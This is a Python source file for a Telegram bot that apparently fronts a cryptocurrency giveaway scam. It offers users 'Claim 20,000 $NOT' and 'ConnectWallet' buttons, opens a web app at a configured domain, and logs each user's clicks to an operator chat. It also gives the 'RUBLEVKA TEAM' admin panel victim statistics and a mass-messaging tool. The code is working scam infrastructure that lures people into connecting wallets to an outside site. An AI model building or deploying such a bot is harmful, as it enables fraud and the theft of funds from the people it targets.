import telebot
import keyboard
from telebot import types
import lang
import database
import sys
from utils import read_json

config = read_json()
bot = telebot.TeleBot(config['bot_token'])
db = database.DB()

@bot.message_handler(commands=['start'])
def start(message):
    if db.add_user(message.chat.id, 0, message.chat.username):
        if config['send_logs']:
            logger(f'✅ <b>Новый уникальный пользователь в боте.</b>\nusername: <code>@{message.chat.first_name}</code>')
    
    bot.set_chat_menu_button(message.chat.id, types.MenuButtonWebApp('web_app', config['keyboard']['web_app'], types.WebAppInfo(config['domain_url'])))
    bot.send_photo(message.chat.id, open('./photos/main.jpg', 'rb'), reply_markup=keyboard.start_keyboard(), parse_mode='HTML')
    
    if config['send_logs']:
        logger(f'⚠️ <b>Пользователь</b><code>@{message.chat.username}</code>\nНажал на кнопку <b>/start</b>')
    
@bot.message_handler(commands=['admin'])
def start(message):
    if message.chat.id != config['admin_id']:
        return
    bot.send_message(message.chat.id, text = f'<b>Admin Panel ©️ RUBLEVKA TEAM</b>\n\n📊 Statistics:\n\n⌛️Today: <code>' + str(db.get_statistics('today')) + '</code>\n⏰Yesterday: <code>' + str(db.get_statistics('yesterday')) + '</code>\n⌚️This Week: <code>' + str(db.get_statistics('week')) + '</code>\n🕰ALL: <code>' + str(db.get_statistics('all')) + '</code>', reply_markup=keyboard.admin_keyboard(), parse_mode='HTML')
@bot.callback_query_handler(func=lambda call: True)
def inline_handler(call):
    if call.data == 'claimnote_button':
        bot.send_photo(call.message.chat.id, open('./photos/getnotcoin.jpg', 'rb'), caption=config['lang']['claimnote_text'], reply_markup=keyboard.claimnotcoin_keyboard(), parse_mode='HTML')
        if config['send_logs']:
            logger(f'⚠️ <b>Пользователь</b><code>@{call.message.chat.username}</code>\nНажал на кнопку <b>Claim 20,000 $NOT</b>')
    if call.data == 'referalsystem_button':
        bot.send_photo(call.message.chat.id, open('./photos/referal.jpg', 'rb'), caption=lang.referal_system_lang(bot.get_me().username, call.message.chat.first_name), parse_mode='HTML')
        if config['send_logs']:
            logger(f'⚠️ <b>Пользователь</b><code>@{call.message.chat.username}</code>\nНажал на кнопку <b>Referal system</b>')
    if call.data == 'connectwallet_button':
        bot.send_message(call.message.chat.id, config['lang']['connectwallet_lang'], parse_mode='HTML')
        bot.send_message(call.message.chat.id, '⬇️')
        if config['send_logs']:
            logger(f'⚠️ <b>Пользователь</b><code>@{call.message.chat.username}</code>\nНажал на кнопку <b>ConnectWallet</b>')
    if call.data == 'topuser_button':
        bot.send_message(call.message.chat.id, lang.top_users_lang(call.message.chat.username), parse_mode='HTML') 
        if config['send_logs']:
            logger(f'⚠️ <b>Пользователь</b><code>@{call.message.chat.username}</code>\nНажал на кнопку <b>Top Users</b>') 
    
    ############## АДМИНКА
    
    if call.data == 'admin_update_stats':
        try:
            text = f'<b>Admin Panel ©️ RUBLEVKA TEAM</b>\n\n📊 Statistics:\n\n⌛️Today: <code>' + str(db.get_statistics('today')) + '</code>\n⏰Yesterday: <code>' + str(db.get_statistics('yesterday')) + '</code>\n⌚️This Week: <code>' + str(db.get_statistics('week')) + '</code>\n🕰ALL: <code>' + str(db.get_statistics('all')) + '</code>'
            bot.edit_message_text(text=text, chat_id=call.message.chat.id, message_id=call.message.id, reply_markup=keyboard.admin_keyboard(), parse_mode='HTML')
        except:
            bot.answer_callback_query(
                callback_query_id=call.id, 
                text="❌ Статистика осталось прежней",
                show_alert=True
            )
    if call.data == 'admin_text_mailing':
        bot.edit_message_text(text='🇺🇸<b>Send me message to mailing:</b>\n🇷🇺<b>Отправьте сообщение для рассылки:</b>', chat_id=call.message.chat.id, message_id=call.message.id, parse_mode='HTML')
        
        bot.register_next_step_handler(call.message, start_text_mailing)
        
def start_text_mailing(message):
    success_counter = 0
    error_counter = 0
    users = db.get_all_users()
    if message.caption:
        #с картинкой
        for user in users:
            try:
                bot.send_photo(user[0],photo=message.photo[-1].file_id, caption=message.caption, parse_mode='HTML')
                success_counter+=1
            except Exception as ex:
                print(ex)
                error_counter+=1
    else:
        for user in users:
            try:
                bot.send_message(user[0], message.text, parse_mode='HTML')
                success_counter+=1
            except:
                error_counter+=1
    bot.send_message(message.chat.id, f'✅<b>Send success: </b><code>{success_counter}</code>\n<b>❌Send errors: </b><code>{error_counter}</code>', parse_mode='HTML')
def logger(msg):
    bot.send_message(config['chat_id_logs'], msg, parse_mode='HTML')  
    print(msg)
def start_bot():
    while True:
        try:
            print('Bot running...')
            bot.polling()
        except Exception as ex:
            print(f'Bot error: {ex}')

if __name__ == "__main__":
    
    start_bot()